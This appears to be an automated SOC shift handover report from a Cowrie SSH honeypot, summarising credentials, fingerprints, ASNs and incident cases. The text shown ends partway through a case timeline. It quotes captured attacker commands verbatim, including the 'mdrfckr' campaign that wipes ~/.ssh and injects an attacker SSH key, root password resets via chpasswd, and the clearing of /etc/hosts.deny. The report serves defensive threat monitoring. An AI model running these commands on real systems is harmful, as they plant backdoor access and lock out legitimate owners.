# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-11-09 |
| **Generated At** | 2026-11-09T03:33:06Z |
| **Shift Time** | 03:33 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **94** |
| Confirmed Threats | **80** |
| False Positives Filtered | **14** (14.9%) |
| Unique Attacker IPs | **45** |
| Countries of Origin | **16** |
| High Severity Cases | **59** |
| Medium Severity Cases | **1** |
| Low Severity Cases | **34** |
| Malware Samples Analyzed | **9** HIGH · **26** MED · 0 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **751** |
| Unique Credential Pairs | **706** |
| Unique Usernames | **264** |
| Unique Passwords | **506** |
| Successful Auth Pairs | **724** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 271 |
| `admin` | 31 |
| `ubuntu` | 27 |
| `user` | 19 |
| `rootssssss23424123123` | 10 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 42 |
| `123` | 23 |
| `1234` | 22 |
| `1` | 13 |
| `12345678` | 13 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `rootssssss23424123123` | `rootssssss23424123123` | 10 |
| `root` | `root3245gs5662d34111111111` | 8 |
| `support` | `support` | 8 |
| `GET http://www.google.com/ HTTP/1.1` | `Host: www.google.com` | 3 |
| `CONNECT www.google.com:443 HTTP/1.1` | `Host: www.google.com:443` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `P@ssw0rd` | `92.118.39.14` | 2026-11-09T00:01:37 |
| `root` | `Passw0rd` | `92.118.39.14` | 2026-11-09T00:04:03 |
| `admin` | `1qazXSW@` | `14.103.118.194` | 2026-11-09T00:06:10 |
| `root` | `p4ssword` | `92.118.39.14` | 2026-11-09T00:06:21 |
| `root` | `p@ssw0rd` | `92.118.39.14` | 2026-11-09T00:06:43 |
| `root` | `root@2026` | `10.0.0.73` | 2026-11-09T00:07:29 |
| `rootssssss23424123123` | `rootssssss23424123123` | `10.0.0.73` | 2026-11-09T00:07:34 |
| `root` | `root3245gs5662d34111111111` | `10.0.0.73` | 2026-11-09T00:07:39 |
| `root` | `passw0rd` | `92.118.39.14` | 2026-11-09T00:08:43 |
| `test1` | `123456` | `129.121.78.222` | 2026-11-09T00:09:50 |
| `rootssssss23424123123` | `rootssssss23424123123` | `129.121.78.222` | 2026-11-09T00:09:51 |
| `test1` | `root3245gs5662d34111111111` | `129.121.78.222` | 2026-11-09T00:09:53 |
| `root` | `password` | `92.118.39.14` | 2026-11-09T00:11:02 |
| `support` | `support` | `10.0.0.73` | 2026-11-09T00:11:56 |
| `root` | `qwerty` | `92.118.39.14` | 2026-11-09T00:12:58 |
| `root` | `ZXCasd123` | `10.0.0.73` | 2026-11-09T00:14:11 |
| `root` | `root1` | `92.118.39.14` | 2026-11-09T00:15:35 |
| `root` | `root12` | `92.118.39.14` | 2026-11-09T00:18:01 |
| `support` | `support` | `176.53.159.196` | 2026-11-09T00:18:02 |
| `root` | `root123` | `92.118.39.14` | 2026-11-09T00:20:12 |
_… 704 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **94** |
| Sessions with Fingerprint | **18** |
| Unique HASSH Fingerprints | **18** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 43 |
| libssh | 14 |
| OpenSSH | 3 |
| Unknown | 2 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 33 | 2 |
| `f555226df196...` | Mirai/variant | 7 | 4 |
| `03a80b21afa8...` | Modern SSH client | 6 | 1 |
| `eff4c24daffc...` | Modern SSH client | 2 | 1 |
| `a289c065bf37...` | Mirai/variant | 2 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 33 | 2 | Mirai/variant |
| `f555226df196...` | libssh | 7 | 4 | Mirai/variant |
| `03a80b21afa8...` | libssh | 6 | 1 | Modern SSH client |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |
| `95420f9d932d...` | OpenSSH | 2 | 2 | — |
| `a289c065bf37...` | Go SSH scanner | 2 | 1 | Mirai/variant |
| `0a07365cc01f...` | Go SSH scanner | 2 | 1 | Generic scanner |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **38** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 8 | 5 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:d3DoksFmtAnj"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `121.229.9.97`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo -e "admin.123\nrHL8iN8jvtu3\nrHL8iN8jvtu3"|passwd|bash
```
```
Enter new UNIX password:
```
Source IPs: `14.103.118.136`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `121.229.9.97`, `129.121.78.222`, `14.103.118.194`, `43.139.30.228`, `50.6.205.37`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **45** |
| Unique ASNs | **22** |
| High-Risk ASNs | **17** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 19 | HIGH |
| `AS398324` | Censys, Inc. | 3 | HIGH |
| `AS31898` | Oracle Corporation | 2 | HIGH |
| `AS15169` | Google LLC | 2 | HIGH |
| `AS4134` | CHINANET BACKBONE | 2 | HIGH |
| `AS45090` | Shenzhen Tencent Computer Systems Company Limited | 1 | HIGH |
| `AS267235` | MR NETWORKS - INTERNET BANDA LARGA LTDA | 1 | HIGH |
| `AS271672` | L OLIVEIRA BARROS | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (53)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-9d8551c6c820

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-11-09 00:01 |
| **Last Seen** | 2026-11-09 00:03 |
| **Session Duration** | 155s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_77d839d18674762aa6b87e1a91b5b6fb_small_control'"'"' '"'"'check_77d839d18674762aa6b87e1a91b5b6fb'"'"'', printf '\n%s|%s\n' 'check_77d839d18674762aa6b87e1a91b5b6fb_small_control' 'check_77d839d18674762aa6b87e1a91b5b6fb', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_77d839d18674762aa6b87e1a91b5b6fb_small_math'"'"' "$((771*928+29))"', (771*928+29, printf '\n%s|%s\n' 'check_77d839d18674762aa6b87e1a91b5b6fb_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-09 00:01:20` | `cowrie.session.connect` |
| `2026-11-09 00:01:22` | `cowrie.client.version` |
| `2026-11-09 00:01:22` | `cowrie.client.kex` |
| `2026-11-09 00:01:37` | `cowrie.login.success` |
| `2026-11-09 00:01:38` | `cowrie.client.size` |
| `2026-11-09 00:01:39` | `cowrie.session.params` |
| `2026-11-09 00:01:40` | `cowrie.command.input` |
| `2026-11-09 00:01:40` | `cowrie.command.input` |
| `2026-11-09 00:01:41` | `cowrie.command.input` |
| `2026-11-09 00:01:41` | `cowrie.command.input` |
| `2026-11-09 00:01:41` | `cowrie.command.input` |
| `2026-11-09 00:01:41` | `cowrie.command.input` |
| `2026-11-09 00:01:41` | `cowrie.command.input` |
| `2026-11-09 00:01:41` | `cowrie.command.input` |
| `2026-11-09 00:01:41` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6519bf8868be

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-11-09 00:03 |
| **Last Seen** | 2026-11-09 00:06 |
| **Session Duration** | 139s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_944707f81ab9c92cd01c344630734a16_small_control'"'"' '"'"'check_944707f81ab9c92cd01c344630734a16'"'"'', printf '\n%s|%s\n' 'check_944707f81ab9c92cd01c344630734a16_small_control' 'check_944707f81ab9c92cd01c344630734a16', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_944707f81ab9c92cd01c344630734a16_small_math'"'"' "$((74*59+33))"', (74*59+33, printf '\n%s|%s\n' 'check_944707f81ab9c92cd01c344630734a16_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-09 00:03:56` | `cowrie.session.connect` |
| `2026-11-09 00:03:58` | `cowrie.client.version` |
| `2026-11-09 00:03:58` | `cowrie.client.kex` |
| `2026-11-09 00:04:03` | `cowrie.login.success` |
| `2026-11-09 00:04:08` | `cowrie.client.size` |
| `2026-11-09 00:04:10` | `cowrie.session.params` |
| `2026-11-09 00:04:11` | `cowrie.command.input` |
| `2026-11-09 00:04:11` | `cowrie.command.input` |
| `2026-11-09 00:04:11` | `cowrie.command.input` |
| `2026-11-09 00:04:11` | `cowrie.command.input` |
| `2026-11-09 00:04:11` | `cowrie.command.input` |
| `2026-11-09 00:04:11` | `cowrie.command.input` |
| `2026-11-09 00:04:11` | `cowrie.command.input` |
| `2026-11-09 00:04:11` | `cowrie.command.input` |
| `2026-11-09 00:04:11` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00b2ef0c13bb

| Field | Detail |
|---|---|
| **Source IP** | `14.103.118[.]194` |
| **First Seen** | 2026-11-09 00:06 |
| **Last Seen** | 2026-11-09 00:11 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-09 00:06:09` | `cowrie.session.connect` |
| `2026-11-09 00:06:09` | `cowrie.client.version` |
| `2026-11-09 00:06:09` | `cowrie.client.kex` |
| `2026-11-09 00:06:10` | `cowrie.login.success` |
| `2026-11-09 00:06:11` | `cowrie.session.params` |
| `2026-11-09 00:06:11` | `cowrie.command.input` |
| `2026-11-09 00:06:11` | `cowrie.command.failed` |
| `2026-11-09 00:06:11` | `cowrie.log.closed` |
| `2026-11-09 00:06:12` | `cowrie.session.params` |
| `2026-11-09 00:06:12` | `cowrie.command.input` |
| `2026-11-09 00:06:12` | `cowrie.session.file_download` |
| `2026-11-09 00:06:12` | `cowrie.log.closed` |
| `2026-11-09 00:11:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.118[.]194` to AbuseIPDB if not already reported
- [ ] Block `14.103.118[.]194` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c5a1b27f44a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-11-09 00:06 |
| **Last Seen** | 2026-11-09 00:06 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-09 00:06:15` | `cowrie.session.connect` |
| `2026-11-09 00:06:16` | `cowrie.client.version` |
| `2026-11-09 00:06:16` | `cowrie.client.kex` |
| `2026-11-09 00:06:21` | `cowrie.login.success` |
| `2026-11-09 00:06:25` | `cowrie.client.size` |
| `2026-11-09 00:06:28` | `cowrie.session.params` |
| `2026-11-09 00:06:38` | `cowrie.log.closed` |
| `2026-11-09 00:06:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29e6c7ecfd3b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-11-09 00:06 |
| **Last Seen** | 2026-11-09 00:08 |
| **Session Duration** | 123s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_505f6c3a7fbe89a388a0c5b15364a768_small_control'"'"' '"'"'check_505f6c3a7fbe89a388a0c5b15364a768'"'"'', printf '\n%s|%s\n' 'check_505f6c3a7fbe89a388a0c5b15364a768_small_control' 'check_505f6c3a7fbe89a388a0c5b15364a768', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_505f6c3a7fbe89a388a0c5b15364a768_small_math'"'"' "$((636*950+12))"', (636*950+12, printf '\n%s|%s\n' 'check_505f6c3a7fbe89a388a0c5b15364a768_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-09 00:06:38` | `cowrie.session.connect` |
| `2026-11-09 00:06:39` | `cowrie.client.version` |
| `2026-11-09 00:06:39` | `cowrie.client.kex` |
| `2026-11-09 00:06:43` | `cowrie.login.success` |
| `2026-11-09 00:06:46` | `cowrie.client.size` |
| `2026-11-09 00:06:47` | `cowrie.session.params` |
| `2026-11-09 00:06:47` | `cowrie.command.input` |
| `2026-11-09 00:06:47` | `cowrie.command.input` |
| `2026-11-09 00:06:47` | `cowrie.command.input` |
| `2026-11-09 00:06:47` | `cowrie.command.input` |
| `2026-11-09 00:06:47` | `cowrie.command.input` |
| `2026-11-09 00:06:47` | `cowrie.command.input` |
| `2026-11-09 00:06:47` | `cowrie.command.input` |
| `2026-11-09 00:06:48` | `cowrie.command.input` |
| `2026-11-09 00:06:48` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54a08ed70b23

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-11-09 00:08 |
| **Last Seen** | 2026-11-09 00:10 |
| **Session Duration** | 132s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_a02e64bd1e6435436b535263ab8832d2_small_control'"'"' '"'"'check_a02e64bd1e6435436b535263ab8832d2'"'"'', printf '\n%s|%s\n' 'check_a02e64bd1e6435436b535263ab8832d2_small_control' 'check_a02e64bd1e6435436b535263ab8832d2', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_a02e64bd1e6435436b535263ab8832d2_small_math'"'"' "$((130*24+73))"', (130*24+73, printf '\n%s|%s\n' 'check_a02e64bd1e6435436b535263ab8832d2_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-09 00:08:41` | `cowrie.session.connect` |
| `2026-11-09 00:08:41` | `cowrie.client.version` |
| `2026-11-09 00:08:41` | `cowrie.client.kex` |
| `2026-11-09 00:08:43` | `cowrie.login.success` |
| `2026-11-09 00:08:48` | `cowrie.client.size` |
| `2026-11-09 00:08:52` | `cowrie.session.params` |
| `2026-11-09 00:08:52` | `cowrie.command.input` |
| `2026-11-09 00:08:52` | `cowrie.command.input` |
| `2026-11-09 00:08:52` | `cowrie.command.input` |
| `2026-11-09 00:08:52` | `cowrie.command.input` |
| `2026-11-09 00:08:52` | `cowrie.command.input` |
| `2026-11-09 00:08:52` | `cowrie.command.input` |
| `2026-11-09 00:08:52` | `cowrie.command.input` |
| `2026-11-09 00:08:52` | `cowrie.command.input` |
| `2026-11-09 00:08:52` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a3f543c3267

| Field | Detail |
|---|---|
| **Source IP** | `129.121.78[.]222` |
| **First Seen** | 2026-11-09 00:09 |
| **Last Seen** | 2026-11-09 00:09 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-09 00:09:50` | `cowrie.session.connect` |
| `2026-11-09 00:09:50` | `cowrie.client.version` |
| `2026-11-09 00:09:50` | `cowrie.client.kex` |
| `2026-11-09 00:09:50` | `cowrie.login.success` |
| `2026-11-09 00:09:51` | `cowrie.session.params` |
| `2026-11-09 00:09:51` | `cowrie.command.input` |
| `2026-11-09 00:09:51` | `cowrie.command.failed` |
| `2026-11-09 00:09:51` | `cowrie.log.closed` |
| `2026-11-09 00:09:51` | `cowrie.session.params` |
| `2026-11-09 00:09:51` | `cowrie.command.input` |
| `2026-11-09 00:09:51` | `cowrie.session.file_download` |
| `2026-11-09 00:09:51` | `cowrie.log.closed` |
| `2026-11-09 00:09:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.78[.]222` to AbuseIPDB if not already reported
- [ ] Block `129.121.78[.]222` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9acbba159489

| Field | Detail |
|---|---|
| **Source IP** | `129.121.78[.]222` |
| **First Seen** | 2026-11-09 00:09 |
| **Last Seen** | 2026-11-09 00:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-09 00:09:51` | `cowrie.session.connect` |
| `2026-11-09 00:09:51` | `cowrie.client.version` |
| `2026-11-09 00:09:51` | `cowrie.client.kex` |
| `2026-11-09 00:09:51` | `cowrie.login.success` |
| `2026-11-09 00:09:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.78[.]222` to AbuseIPDB if not already reported
- [ ] Block `129.121.78[.]222` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68c181f13d7a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-11-09 00:10 |
| **Last Seen** | 2026-11-09 00:12 |
| **Session Duration** | 118s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_d71941939f1ec3bcef7fa7312736b085_small_control'"'"' '"'"'check_d71941939f1ec3bcef7fa7312736b085'"'"'', printf '\n%s|%s\n' 'check_d71941939f1ec3bcef7fa7312736b085_small_control' 'check_d71941939f1ec3bcef7fa7312736b085', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_d71941939f1ec3bcef7fa7312736b085_small_math'"'"' "$((231*932+67))"', (231*932+67, printf '\n%s|%s\n' 'check_d71941939f1ec3bcef7fa7312736b085_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-09 00:10:54` | `cowrie.session.connect` |
| `2026-11-09 00:10:55` | `cowrie.client.version` |
| `2026-11-09 00:10:58` | `cowrie.client.kex` |
| `2026-11-09 00:11:02` | `cowrie.login.success` |
| `2026-11-09 00:11:05` | `cowrie.client.size` |
| `2026-11-09 00:11:06` | `cowrie.session.params` |
| `2026-11-09 00:11:07` | `cowrie.command.input` |
| `2026-11-09 00:11:07` | `cowrie.command.input` |
| `2026-11-09 00:11:07` | `cowrie.command.input` |
| `2026-11-09 00:11:07` | `cowrie.command.input` |
| `2026-11-09 00:11:07` | `cowrie.command.input` |
| `2026-11-09 00:11:07` | `cowrie.command.input` |
| `2026-11-09 00:11:07` | `cowrie.command.input` |
| `2026-11-09 00:11:07` | `cowrie.command.input` |
| `2026-11-09 00:11:07` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37e524cecf77

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-11-09 00:12 |
| **Last Seen** | 2026-11-09 00:15 |
| **Session Duration** | 150s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_dd12efb47b7f74db188c5e69419e69ab_small_control'"'"' '"'"'check_dd12efb47b7f74db188c5e69419e69ab'"'"'', printf '\n%s|%s\n' 'check_dd12efb47b7f74db188c5e69419e69ab_small_control' 'check_dd12efb47b7f74db188c5e69419e69ab', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_dd12efb47b7f74db188c5e69419e69ab_small_math'"'"' "$((763*914+44))"', (763*914+44, printf '\n%s|%s\n' 'check_dd12efb47b7f74db188c5e69419e69ab_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-09 00:12:53` | `cowrie.session.connect` |
| `2026-11-09 00:12:53` | `cowrie.client.version` |
| `2026-11-09 00:12:53` | `cowrie.client.kex` |
| `2026-11-09 00:12:58` | `cowrie.login.success` |
| `2026-11-09 00:13:04` | `cowrie.client.size` |
| `2026-11-09 00:13:05` | `cowrie.session.params` |
| `2026-11-09 00:13:05` | `cowrie.command.input` |
| `2026-11-09 00:13:05` | `cowrie.command.input` |
| `2026-11-09 00:13:05` | `cowrie.command.input` |
